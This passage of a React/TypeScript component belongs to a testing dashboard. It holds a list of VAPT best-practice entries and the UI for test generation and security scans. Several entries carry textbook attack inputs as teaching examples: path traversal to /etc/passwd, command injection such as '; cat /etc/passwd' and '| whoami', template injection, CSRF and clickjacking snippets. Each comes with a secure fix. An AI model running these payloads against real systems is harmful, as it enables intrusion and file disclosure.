      title: "Insufficient Logging & Monitoring",
      description: "Ensure critical security events (login failures, access control breaches) are logged, monitored, and alerts are configured.",
      severity: "medium",
      category: "Monitoring",
      example: "Events that MUST be logged:\n- Failed login attempts (username, IP, timestamp)\n- Privilege escalation attempts\n- Input validation failures\n- Authentication token anomalies\n\nDO NOT log:\n- Passwords or session tokens\n- Credit card numbers\n- Personal sensitive data\n\nExample log:\n{\"event\": \"failed_login\", \"user\": \"admin\", \"ip\": \"1.2.3.4\", \"time\": \"2024-01-20T10:30:00Z\"}",
      testingSteps: [
        "Attempt multiple failed logins - check if logged",
        "Try unauthorized access - verify logging",
        "Check if sensitive data appears in logs",
        "Verify log tampering is prevented (write-only access)",
        "Test if alerts trigger for suspicious activities"
      ]
    },
    {
      id: "11",
      title: "CSRF Token Validation",
      description: "Verify that all state-changing operations (POST, PUT, DELETE) require valid CSRF tokens to prevent Cross-Site Request Forgery.",
      severity: "high",
      category: "Session Management",
      example: "CSRF Attack:\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\">\n\nVulnerable form:\n<form action=\"/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\">\n</form>\n\nSecure form:\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"abc123xyz\">\n  <input name=\"to\">\n</form>\n\nServer validates csrf_token matches session",
      testingSteps: [
        "Identify state-changing operations (update profile, transfer money)",
        "Submit request without CSRF token - should fail",
        "Try to reuse old/expired CSRF tokens",
        "Test if GET requests can perform state changes",
        "Verify CSRF token is unique per session"
      ]
    },
    {
      id: "12",
      title: "Clickjacking Protection",
      description: "Test for X-Frame-Options and CSP frame-ancestors headers to prevent UI redress attacks where site is embedded in malicious iframe.",
      severity: "medium",
      category: "Client-Side",
      example: "Clickjacking attack:\n<iframe src=\"https://bank.com/transfer\"></iframe>\n<button style=\"opacity:0; position:absolute\">Win Prize</button>\n\nUser thinks they're clicking 'Win Prize' but actually clicking 'Transfer Money'\n\nProtection headers:\nX-Frame-Options: DENY\nContent-Security-Policy: frame-ancestors 'none'\n\nTest: Try embedding site in iframe, should be blocked",
      testingSteps: [
        "Check for X-Frame-Options header in response",
        "Verify CSP frame-ancestors directive",
        "Try loading site in iframe - should fail",
        "Test if frame-busting JavaScript is used",
        "Verify sensitive pages cannot be framed"
      ]
    },
    {
      id: "13",
      title: "Directory Traversal",
      description: "Test file operations for path traversal vulnerabilities that allow access to files outside intended directory.",
      severity: "high",
      category: "File Operations",
      example: "Path Traversal Attack:\nGET /download?file=../../../etc/passwd\nGET /api/files?path=....//....//etc/passwd\n\nVulnerable code:\nfile_path = '/uploads/' + user_input\nopen(file_path)  # Can access any file!\n\nSecure code:\nimport os\nbase_dir = '/uploads/'\nfile_path = os.path.join(base_dir, user_input)\nif not file_path.startswith(base_dir):\n  raise SecurityError()",
      testingSteps: [
        "Test file parameters with: ../../../etc/passwd",
        "Try URL encoding: %2e%2e%2f (../) bypass",
        "Test double encoding: %252e%252e%252f",
        "Try absolute paths: /etc/passwd",
        "Verify file access is restricted to allowed directories"
      ]
    },
    {
      id: "14",
      title: "Remote Code Execution",
      description: "Test for vulnerabilities that allow execution of arbitrary code on the server (command injection, unsafe eval, template injection).",
      severity: "critical",
      category: "Injection",
      example: "Command Injection:\nping -c 1 user_input\nAttack: 127.0.0.1; cat /etc/passwd\n\nTemplate Injection:\n{{7*7}} → renders as 49 (vulnerable)\n{{config.items()}} → exposes config\n\nCode Injection:\neval(user_input)  # NEVER do this!\n\nSecure: Use parameterized commands, avoid eval, sanitize template inputs",
      testingSteps: [
        "Test input fields with: ; ls -la",
        "Try command chaining: | whoami, && cat /etc/passwd",
        "Test template injection: {{7*7}}, ${7*7}",
        "Check for code injection: eval(), exec() with user input",
        "Verify input validation and whitelisting"
      ]
    },
    {
      id: "15",
      title: "Business Logic Flaws",
      description: "Test for flaws in application logic that can be exploited: race conditions, price manipulation, workflow bypasses.",
      severity: "high",
      category: "Logic",
      example: "Race Condition:\n1. User has $100 balance\n2. Initiate two simultaneous $100 withdrawals\n3. Both succeed, user has -$100 (lack of transaction locking)\n\nPrice Manipulation:\nPOST /checkout\n{\"productId\": 123, \"price\": 1.00, \"quantity\": 1}\nAttacker changes price from $1000 to $1\n\nWorkflow Bypass:\nSkip payment step by directly accessing /order-complete",
      testingSteps: [
        "Test concurrent requests for race conditions",
        "Manipulate prices, quantities in request body",
        "Skip workflow steps (payment, verification)",
        "Test negative numbers in quantity/amount fields",
        "Verify all business rules are enforced server-side"
      ]
    },
    {
      id: "16",
      title: "Rate Limiting & DoS Protection",
      description: "Verify API endpoints and critical functions have rate limiting to prevent brute force attacks and denial of service.",
      severity: "medium",
      category: "Availability",
      example: "Without rate limiting:\n- Attacker tries 10,000 passwords/sec on login\n- API abuse costs $1000s in cloud bills\n- Account enumeration via timing\n\nRate limiting:\n429 Too Many Requests\nRetry-After: 60\n\nImplementation:\n- Login: 5 attempts per 15 minutes per IP\n- API: 100 requests per hour per user\n- Password reset: 3 per hour per account",
      testingSteps: [
        "Send 100+ rapid requests to login endpoint",
        "Verify 429 status code returned after limit",
        "Check Retry-After header is present",
        "Test if rate limit is per IP, user, or both",
        "Verify rate limits on expensive operations (search, file uploads)"
      ]
    },
    {
      id: "17",
      title: "Password Reset Token Security",
      description: "Test password reset mechanism for token predictability, expiration, single-use enforcement, and information disclosure.",
      severity: "high",
      category: "Authentication",
      example: "Vulnerabilities:\n- Predictable tokens: token=12345 (easily guessable)\n- No expiration: token works forever\n- Reusable tokens: can reset multiple times\n- Token in URL: logged in browser history\n\nSecure implementation:\n- Cryptographically random tokens (32+ bytes)\n- Expire after 1 hour\n- Single use only\n- Invalidate on password change\n- No username/email disclosure",
      testingSteps: [
        "Request password reset, analyze token randomness",
        "Try using token multiple times - should fail after first use",
        "Test if token expires (wait 1+ hour)",
        "Check if old tokens invalidate after password change",
        "Verify reset doesn't disclose if email exists"
      ]
    },
    {
      id: "18",
      title: "API Security Testing",
      description: "Test REST/GraphQL APIs for authentication, authorization, injection flaws, and excessive data exposure.",
      severity: "high",
      category: "API",
      example: "API vulnerabilities:\n\n1. Missing authentication:\nGET /api/users → returns all users (no auth!)\n\n2. IDOR:\nGET /api/orders/123 → user A sees user B's order\n\n3. Mass assignment:\nPOST /api/users {\"name\": \"Bob\", \"isAdmin\": true}\n\n4. GraphQL introspection:\nquery { __schema { types { name } } }\nExposes entire API schema\n\nSecure: Require auth, validate IDs, whitelist fields, disable introspection in production",
      testingSteps: [
        "Test API endpoints without authentication",
        "Try accessing other users' resources (IDOR)",
        "Test for SQL injection in query parameters",
        "Check for excessive data exposure in responses",
        "Verify rate limiting on API endpoints"
      ]
    },
    {
      id: "19",
      title: "Session Fixation & Hijacking",
      description: "Verify session IDs are regenerated after login, properly secured (HttpOnly, Secure flags), and not predictable.",
      severity: "high",
      category: "Session Management",
      example: "Session Fixation:\n1. Attacker gets session ID: SESSID=abc123\n2. Victim logs in with same SESSID\n3. Attacker now logged in as victim\n\nSession Hijacking:\nsteal cookie via XSS: document.cookie\n\nSecure cookies:\nSet-Cookie: SESSID=xyz789; HttpOnly; Secure; SameSite=Strict\n- HttpOnly: JavaScript cannot access\n- Secure: Only sent over HTTPS\n- SameSite: CSRF protection",
      testingSteps: [
        "Note session ID before login, verify it changes after",
        "Check cookie flags: HttpOnly, Secure, SameSite",
        "Test if session survives logout (should not)",
        "Try session hijacking with stolen cookie",
        "Verify session timeout after inactivity"
      ]
    },
    {
      id: "20",
      title: "Content Security Policy",
      description: "Verify CSP headers restrict resource loading to trusted sources, preventing XSS and data injection attacks.",
      severity: "medium",
      category: "Client-Side",
      example: "Weak CSP:\nContent-Security-Policy: default-src *\n(Allows loading from anywhere - useless!)\n\nStrong CSP:\nContent-Security-Policy: \n  default-src 'self'; \n  script-src 'self' https://trusted-cdn.com; \n  style-src 'self' 'unsafe-inline'; \n  img-src 'self' data: https:;\n  connect-src 'self' https://api.example.com;\n\nThis blocks inline scripts and untrusted sources",
      testingSteps: [
        "Check for Content-Security-Policy header",
        "Verify 'unsafe-inline' and 'unsafe-eval' are not used",
        "Test if inline scripts are blocked",
        "Try loading resources from untrusted domains",
        "Use CSP Evaluator tool to assess policy strength"
      ]
    }
  ];

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "bg-destructive text-destructive-foreground";
      case "high": return "bg-orange-500/10 text-orange-500 border-orange-500/20";
      case "medium": return "bg-warning/10 text-warning border-warning/20";
      case "low": return "bg-blue-500/10 text-blue-500 border-blue-500/20";
      case "info": return "bg-muted/10 text-muted-foreground border-muted/20";
      default: return "bg-muted/10 text-muted-foreground border-muted/20";
    }
  };

  const passedTests = testCases.filter(t => t.status === "passed").length;
  const failedTests = testCases.filter(t => t.status === "failed").length;
  const totalTests = testCases.length;

  return (
    <div className="min-h-screen bg-gradient-subtle">
      {/* Header */}
      <header className="bg-card border-b shadow-soft">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center gap-3">
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={() => navigate(`/project/${state?.projectId || '1'}`)}
                className="gap-2"
              >
                <ArrowLeft className="h-4 w-4" />
                Back to Project
              </Button>
              <Separator orientation="vertical" className="h-6" />
              <div className="flex items-center gap-3">
                <div className="bg-warning/10 p-2 rounded-lg">
                  <TestTube2 className="h-5 w-5 text-warning" />
                </div>
                <div>
                  <h1 className="text-xl font-bold text-foreground">Test Agent</h1>
                  <p className="text-sm text-muted-foreground">{state?.projectName || "Project"}</p>
                </div>
              </div>
            </div>
            <div className="flex gap-3">
              <Button 
                variant="outline"
                onClick={handleExecuteTests}
                disabled={isExecuting || testCases.length === 0}
                className="gap-2"
              >
                <Play className="h-4 w-4" />
                {isExecuting ? "Running..." : "Run All Tests"}
              </Button>
              <Button 
                variant="hero"
                onClick={handleGenerateTests}
                disabled={isGenerating}
                className="gap-2"
              >
                <TestTube2 className="h-4 w-4" />
                {isGenerating ? "Generating..." : "Generate Tests"}
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-6">
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="test-cases">Test Cases</TabsTrigger>
            <TabsTrigger value="create">Create Test</TabsTrigger>
            <TabsTrigger value="auto-generate">Auto Generate</TabsTrigger>
            <TabsTrigger value="vapt-testing">VAPT Testing</TabsTrigger>
            <TabsTrigger value="results">Results</TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="space-y-6">
            {/* Test Summary */}
            <Card className="bg-gradient-card shadow-soft border-0">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Target className="h-5 w-5" />
                  Test Summary
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                  <div className="text-center p-4 bg-muted/10 rounded-lg">
                    <div className="text-2xl font-bold text-foreground">{totalTests}</div>
                    <div className="text-sm text-muted-foreground">Total Tests</div>
                  </div>
                  <div className="text-center p-4 bg-success/10 rounded-lg">
                    <div className="text-2xl font-bold text-success">{passedTests}</div>
                    <div className="text-sm text-muted-foreground">Passed</div>
                  </div>
                  <div className="text-center p-4 bg-destructive/10 rounded-lg">
                    <div className="text-2xl font-bold text-destructive">{failedTests}</div>
                    <div className="text-sm text-muted-foreground">Failed</div>
                  </div>
                  <div className="text-center p-4 bg-warning/10 rounded-lg">
                    <div className="text-2xl font-bold text-warning">{modules.length}</div>
                    <div className="text-sm text-muted-foreground">Modules</div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Test Modules */}
            <Card className="bg-gradient-card shadow-soft border-0">
              <CardHeader>
                <CardTitle>Test Modules</CardTitle>
                <CardDescription>
                  Test cases organized by BRD Agent modules
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid gap-4">
                  {modules.map((module) => (
                    <div key={module.id} className="flex items-center justify-between p-4 bg-muted/5 rounded-lg border">
                      <div>
                        <h4 className="font-medium">{module.name}</h4>
                        <p className="text-sm text-muted-foreground">{module.description}</p>
                      </div>
                      <Badge variant="secondary">{module.testCount} tests</Badge>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="test-cases" className="space-y-6">
            {(isExecuting) && (
              <Card className="bg-gradient-card shadow-soft border-0">
                <CardContent className="p-6">
                  <div className="space-y-4">
                    <div className="flex items-center gap-3">
                      <Play className="h-5 w-5 text-warning animate-pulse" />
                      <span className="font-medium">Executing Tests with Playwright...</span>
                    </div>
                    <Progress value={progress} className="w-full" />
                    <p className="text-sm text-muted-foreground">
                      Running automated tests and capturing screenshots
                    </p>
                  </div>
                </CardContent>
              </Card>
            )}

            <div className="grid gap-4">
              {testCases.map((testCase) => (
                <Card key={testCase.id} className="bg-gradient-card shadow-soft border-0">
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        {getStatusIcon(testCase.status)}
                        <div>
                          <CardTitle className="text-lg">{testCase.name}</CardTitle>
                          <CardDescription>{testCase.description}</CardDescription>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <Badge className={getStatusColor(testCase.status)}>
                          {testCase.status}
                        </Badge>
                        <Button variant="ghost" size="sm">
                          <Edit className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <Label className="text-sm font-medium">Module</Label>
                        <Badge variant="outline" className="mt-1">{testCase.module}</Badge>
                      </div>
                      {testCase.lastRun && (
                        <div>
                          <Label className="text-sm font-medium">Last Run</Label>
                          <p className="text-sm text-muted-foreground">{testCase.lastRun}</p>
                        </div>
                      )}
                    </div>
                    
                    <div>
                      <Label className="text-sm font-medium">Test Steps</Label>
                      <ul className="mt-2 space-y-1">
                        {testCase.steps.map((step, index) => (
                          <li key={index} className="text-sm text-muted-foreground flex items-start gap-2">
                            <span className="text-primary font-medium mt-0.5">{index + 1}.</span>
                            {step}
                          </li>
                        ))}
                      </ul>
                    </div>

                    <div>
                      <Label className="text-sm font-medium">Expected Result</Label>
                      <p className="text-sm text-muted-foreground mt-1">{testCase.expectedResult}</p>
                    </div>

                    {testCase.screenshot && (
                      <div className="flex items-center gap-2 p-3 bg-muted/5 rounded-lg">
                        <Image className="h-4 w-4 text-primary" />
                        <span className="text-sm">Screenshot: {testCase.screenshot}</span>
                        <Button variant="ghost" size="sm" className="ml-auto">
                          <Download className="h-4 w-4" />
                        </Button>
                      </div>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          <TabsContent value="create" className="space-y-6">
            <Card className="bg-gradient-card shadow-soft border-0">
              <CardHeader>
                <CardTitle>Create New Test Case</CardTitle>
                <CardDescription>
                  Manually create a custom test case with TypeScript and Playwright
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="testName">Test Name</Label>
                    <Input 
                      id="testName"
                      value={newTestCase.name}
                      onChange={(e) => setNewTestCase(prev => ({...prev, name: e.target.value}))}
                      placeholder="Enter test name"
                    />
                  </div>
                  <div>
                    <Label htmlFor="module">Module</Label>
                    <Input 
                      id="module"
                      value={newTestCase.module}
                      onChange={(e) => setNewTestCase(prev => ({...prev, module: e.target.value}))}
                      placeholder="Select or enter module"
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="description">Description</Label>
                  <Textarea 
                    id="description"
                    value={newTestCase.description}
                    onChange={(e) => setNewTestCase(prev => ({...prev, description: e.target.value}))}
                    placeholder="Describe what this test validates"
                  />
                </div>

                <div>
                  <div className="flex items-center justify-between mb-3">
                    <Label>Test Steps</Label>
                    <Button variant="outline" size="sm" onClick={handleAddTestStep}>
                      <Plus className="h-4 w-4 mr-2" />
                      Add Step
                    </Button>
                  </div>
                  <div className="space-y-2">
                    {newTestCase.steps.map((step, index) => (
                      <div key={index} className="flex gap-2">
                        <Input 
                          value={step}
                          onChange={(e) => handleUpdateTestStep(index, e.target.value)}
                          placeholder={`Step ${index + 1}`}
                        />
                        {newTestCase.steps.length > 1 && (
                          <Button 
                            variant="ghost" 
                            size="sm" 
                            onClick={() => handleRemoveTestStep(index)}
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        )}
                      </div>
                    ))}
                  </div>
                </div>

                <div>
                  <Label htmlFor="expectedResult">Expected Result</Label>
                  <Textarea 
                    id="expectedResult"
                    value={newTestCase.expectedResult}
                    onChange={(e) => setNewTestCase(prev => ({...prev, expectedResult: e.target.value}))}
                    placeholder="Describe the expected outcome"
                  />
                </div>

                <div>
                  <Label htmlFor="testCode">TypeScript Test Code</Label>
                  <Textarea 
                    id="testCode"
                    value={newTestCase.code}
                    onChange={(e) => setNewTestCase(prev => ({...prev, code: e.target.value}))}
                    className="font-mono text-sm"
                    rows={10}
                  />
                </div>

                <div className="flex gap-3 flex-wrap">
                  <Button onClick={handleCreateTestCase} className="gap-2">
                    <Plus className="h-4 w-4" />
                    Create Test Case
                  </Button>
                  <Button variant="outline" className="gap-2">
                    <Upload className="h-4 w-4" />
                    Upload Test File
                  </Button>
                  <Button 
                    variant="secondary" 
                    onClick={handleExecuteSingleTest}
                    disabled={isExecuting || !newTestCase.name || !newTestCase.code}
                    className="gap-2"
                  >
                    <Play className="h-4 w-4" />
                    {isExecuting ? "Executing..." : "Execute Test Case"}
                  </Button>
                  <Button 
                    variant="hero" 
                    onClick={handleSaveTestCase}
                    disabled={!newTestCase.name || !newTestCase.module}
                    className="gap-2"
                  >
                    <CheckCircle className="h-4 w-4" />
                    Save Test Case
                  </Button>
                </div>

                {isExecuting && (
                  <Card className="bg-muted/5 border-warning/20">
                    <CardContent className="p-4">
                      <div className="flex items-center gap-3">
                        <Play className="h-5 w-5 text-warning animate-pulse" />
                        <span className="text-sm font-medium">Executing test case...</span>
                      </div>
                    </CardContent>
                  </Card>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="auto-generate" className="space-y-6">
            <Card className="bg-gradient-card shadow-soft border-0">
              <CardHeader>
                <CardTitle>Auto-Generate Tests</CardTitle>
                <CardDescription>
                  Automatically generate test cases using Playwright by analyzing your application
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div>
                  <Label htmlFor="appUrl">Application URL</Label>
                  <Input 
                    id="appUrl"
                    type="url"
                    value={applicationUrl}
                    onChange={(e) => setApplicationUrl(e.target.value)}
                    placeholder="https://your-application.com"
                  />
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="username">Username (Optional)</Label>
                    <Input 
                      id="username"
                      value={credentials.username}
                      onChange={(e) => setCredentials(prev => ({...prev, username: e.target.value}))}
                      placeholder="Test user credentials"
                    />
                  </div>
                  <div>
                    <Label htmlFor="password">Password (Optional)</Label>
                    <Input 
                      id="password"
                      type="password"
                      value={credentials.password}
                      onChange={(e) => setCredentials(prev => ({...prev, password: e.target.value}))}
                      placeholder="Test user password"
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="targetModule">Target Module (Optional)</Label>
                  <Input 
                    id="targetModule"
                    value={selectedModule}
                    onChange={(e) => setSelectedModule(e.target.value)}
                    placeholder="Focus on specific module"
                  />
                </div>

                {isGenerating && (
                  <Card className="bg-muted/5 border-warning/20">
                    <CardContent className="p-6">
                      <div className="space-y-4">
                        <div className="flex items-center gap-3">
                          <Settings className="h-5 w-5 text-warning animate-spin" />
                          <span className="font-medium">Analyzing Application...</span>
                        </div>
                        <Progress value={progress} className="w-full" />
                        <div className="space-y-2 text-sm text-muted-foreground">
                          <p>• Crawling application pages</p>
                          <p>• Identifying interactive elements</p>
                          <p>• Analyzing user flows</p>
                          <p>• Generating TypeScript test code</p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                <Button 
                  onClick={handleGenerateTests}
                  disabled={isGenerating || !applicationUrl}
                  className="gap-2"
                  size="lg"
                >
                  <Globe className="h-4 w-4" />
                  {isGenerating ? "Generating Tests..." : "Analyze & Generate Tests"}
                </Button>

                {/* Generated Results Table */}
                {generatedResults && (
                  <Card className="bg-gradient-card shadow-soft border-0 mt-6">
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <div>
                          <CardTitle className="text-lg">Generated Test Results</CardTitle>
                          <CardDescription>
                            {generatedResults.testCases.length} test cases generated across {generatedResults.modules.length} modules
                          </CardDescription>
                        </div>
                        <Button onClick={handleAddGeneratedTests} className="gap-2">
                          <Plus className="h-4 w-4" />
                          Add All Tests
                        </Button>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-6">
                        {generatedResults.modules.map((module) => {
                          const moduleTests = generatedResults.testCases.filter(tc => tc.module === module.name);
                          return (
                            <div key={module.id} className="space-y-4">
                              <div className="flex items-center justify-between">
                                <div>
                                  <h4 className="font-semibold text-lg">{module.name}</h4>
                                  <p className="text-sm text-muted-foreground">{module.description}</p>
                                </div>
                                <Badge variant="secondary">{moduleTests.length} tests</Badge>
                              </div>
                              
                              <Table>
                                <TableHeader>
                                  <TableRow>
                                    <TableHead>Test Case</TableHead>
                                    <TableHead>Description</TableHead>
                                    <TableHead>Status</TableHead>
                                    <TableHead>Duration</TableHead>
                                    <TableHead>Actions</TableHead>
                                  </TableRow>
                                </TableHeader>
                                <TableBody>
                                  {moduleTests.map((testCase) => (
                                    <TableRow key={testCase.id}>
                                      <TableCell className="font-medium">{testCase.name}</TableCell>
                                      <TableCell className="text-sm text-muted-foreground max-w-xs truncate">
                                        {testCase.description}
                                      </TableCell>
                                      <TableCell>
                                        <Badge className={getStatusColor(testCase.status)}>
                                          {testCase.status}
                                        </Badge>
                                      </TableCell>
                                      <TableCell>
                                        {testCase.duration ? `${testCase.duration}s` : '-'}
                                      </TableCell>
                                      <TableCell>
                                        <div className="flex gap-2">
                                          <Button 
                                            variant="ghost" 
                                            size="sm" 
                                            onClick={() => handleViewTestCase(testCase)}
                                            className="gap-1"
                                          >
                                            <FileText className="h-3 w-3" />
                                            View
                                          </Button>
                                          <Button 
                                            variant="ghost" 
                                            size="sm"
                                            onClick={() => handleExecuteIndividualTest(testCase.id)}
                                            disabled={executingTestId === testCase.id}
                                            className="gap-1"
                                          >
                                            <Play className="h-3 w-3" />
                                            {executingTestId === testCase.id ? 'Running...' : 'Execute'}
                                          </Button>
                                        </div>
                                      </TableCell>
                                    </TableRow>
                                  ))}
                                </TableBody>
                              </Table>
                            </div>
                          );
                        })}
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* Test Case View Dialog */}
                <Dialog open={!!viewingTestCase} onOpenChange={() => setViewingTestCase(null)}>
                  <DialogContent className="max-w-4xl max-h-[80vh] overflow-y-auto">
                    <DialogHeader>
                      <DialogTitle>{viewingTestCase?.name}</DialogTitle>
                    </DialogHeader>
                    {viewingTestCase && (
                      <div className="space-y-4">
                        <div>
                          <Label className="text-sm font-medium">Description</Label>
                          <p className="text-sm text-muted-foreground mt-1">{viewingTestCase.description}</p>
                        </div>
                        
                        <div>
                          <Label className="text-sm font-medium">Module</Label>
                          <Badge variant="outline" className="mt-1">{viewingTestCase.module}</Badge>
                        </div>

                        <div>
                          <Label className="text-sm font-medium">Test Steps</Label>
                          <ul className="mt-2 space-y-1">
                            {viewingTestCase.steps.map((step, index) => (
                              <li key={index} className="text-sm text-muted-foreground flex items-start gap-2">
                                <span className="text-primary font-medium mt-0.5">{index + 1}.</span>
                                {step}
                              </li>
                            ))}
                          </ul>
                        </div>

                        <div>
                          <Label className="text-sm font-medium">Expected Result</Label>
                          <p className="text-sm text-muted-foreground mt-1">{viewingTestCase.expectedResult}</p>
                        </div>

                        <div>
                          <Label className="text-sm font-medium">TypeScript Test Code</Label>
                          <Textarea 
                            value={viewingTestCase.code}
                            readOnly
                            className="font-mono text-sm mt-2"
                            rows={12}
                          />
                        </div>
                      </div>
                    )}
                  </DialogContent>
                </Dialog>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="vapt-testing" className="space-y-6">
            <Card className="bg-gradient-card shadow-soft border-0">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className="flex items-center gap-2">
                      <Shield className="h-5 w-5 text-primary" />
                      Vulnerability Assessment & Penetration Testing
                    </CardTitle>
                    <CardDescription>
                      Automated security testing to identify vulnerabilities in your application
                    </CardDescription>
                  </div>
                  <Button 
                    variant="outline" 
                    size="sm"
                    onClick={() => setShowBestPractices(true)}
                    className="gap-2"
                  >
                    <Info className="h-4 w-4" />
                    View Best Practices
                  </Button>
                </div>
              </CardHeader>
              <CardContent className="space-y-6">
                <div>
                  <Label htmlFor="vaptUrl">Application URL</Label>
                  <Input 
                    id="vaptUrl"
                    type="url"
                    value={vaptUrl}
                    onChange={(e) => setVaptUrl(e.target.value)}
                    placeholder="https://your-application.com"
                  />
                </div>

                {isVaptTesting && (
                  <Card className="bg-muted/5 border-warning/20">
                    <CardContent className="p-6">
                      <div className="space-y-4">
                        <div className="flex items-center gap-3">
                          <ShieldAlert className="h-5 w-5 text-warning animate-pulse" />
                          <span className="font-medium">Running Security Scan...</span>
                        </div>
                        <Progress value={progress} className="w-full" />
                        <div className="space-y-2 text-sm text-muted-foreground">
                          <p>• Checking for SQL injection vulnerabilities</p>
                          <p>• Testing XSS attack vectors</p>
                          <p>• Analyzing authentication mechanisms</p>
                          <p>• Scanning for security misconfigurations</p>
                          <p>• Checking SSL/TLS configuration</p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                <Button 
                  onClick={handleVaptTest}
                  disabled={isVaptTesting || !vaptUrl}
                  className="gap-2"
                  size="lg"
                >
                  <ShieldAlert className="h-4 w-4" />
                  {isVaptTesting ? "Scanning Application..." : "Test Application for VAPT"}
                </Button>

                {vaptResults.length > 0 && (
                  <Card className="bg-gradient-card shadow-soft border-0 mt-6">
                    <CardHeader>
                      <CardTitle className="text-lg">Security Findings</CardTitle>
                      <CardDescription>
                        {vaptResults.length} vulnerabilities discovered - Click on any finding for detailed analysis
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Vulnerability</TableHead>
                            <TableHead>Severity</TableHead>
                            <TableHead>Description</TableHead>
                            <TableHead>Affected</TableHead>
                            <TableHead>Actions</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {vaptResults.map((result) => (
                            <TableRow key={result.id} className="cursor-pointer hover:bg-muted/50">
                              <TableCell className="font-medium">{result.vulnerability}</TableCell>
                              <TableCell>
                                <Badge className={getSeverityColor(result.severity)}>
                                  {result.severity.toUpperCase()}
                                </Badge>
                              </TableCell>
                              <TableCell className="text-sm max-w-xs truncate">{result.description}</TableCell>
                              <TableCell className="text-sm text-muted-foreground">{result.affected}</TableCell>
                              <TableCell>
                                <Button 
                                  variant="ghost" 
                                  size="sm"
                                  onClick={() => setViewingVaptResult(result)}
                                  className="gap-1"
                                >
                                  <FileText className="h-3 w-3" />
                                  View Details
                                </Button>
                              </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </CardContent>
                  </Card>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* VAPT Result Details Dialog */}
          <Dialog open={!!viewingVaptResult} onOpenChange={() => setViewingVaptResult(null)}>
            <DialogContent className="max-w-5xl max-h-[85vh] overflow-y-auto">
              <DialogHeader>
                <DialogTitle className="flex items-center gap-3">
                  <ShieldAlert className="h-5 w-5 text-destructive" />
                  {viewingVaptResult?.vulnerability}
                  {viewingVaptResult && (
                    <Badge className={getSeverityColor(viewingVaptResult.severity)}>
                      {viewingVaptResult.severity.toUpperCase()}
                    </Badge>
                  )}
                </DialogTitle>
              </DialogHeader>
              {viewingVaptResult && (
                <div className="space-y-5 mt-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label className="text-sm font-semibold">Affected Endpoints</Label>
                      <p className="text-sm text-muted-foreground mt-1">{viewingVaptResult.affected}</p>
                    </div>
                    <div>
                      <Label className="text-sm font-semibold">Risk Impact</Label>
                      <p className="text-sm text-destructive mt-1 font-medium">{viewingVaptResult.impact}</p>
                    </div>
                  </div>

                  <div>
                    <Label className="text-sm font-semibold">Vulnerability Description</Label>
                    <p className="text-sm text-muted-foreground mt-2">{viewingVaptResult.description}</p>
                  </div>

                  <div>
                    <Label className="text-sm font-semibold">Technical Details & Example</Label>
                    <div className="bg-muted/30 p-4 rounded-md mt-2">
                      <pre className="text-xs whitespace-pre-wrap font-mono text-foreground">
{viewingVaptResult.example}
                      </pre>
                    </div>
                  </div>

                  <div>
                    <Label className="text-sm font-semibold">Recommendation</Label>
                    <p className="text-sm text-muted-foreground mt-2">{viewingVaptResult.recommendation}</p>
                  </div>

                  <div>
                    <Label className="text-sm font-semibold">Step-by-Step Resolution Guide</Label>
                    <div className="mt-3 space-y-3">
                      {viewingVaptResult.resolutionSteps.map((step, index) => (
                        <div key={index} className="flex items-start gap-3 p-3 bg-muted/20 rounded-md">
                          <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">
                            {index + 1}
                          </div>
                          <p className="text-sm text-foreground flex-1">{step}</p>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="flex gap-2 pt-4 border-t">
                    <Button variant="outline" className="flex-1">
                      <Download className="h-4 w-4 mr-2" />
                      Export Report
                    </Button>
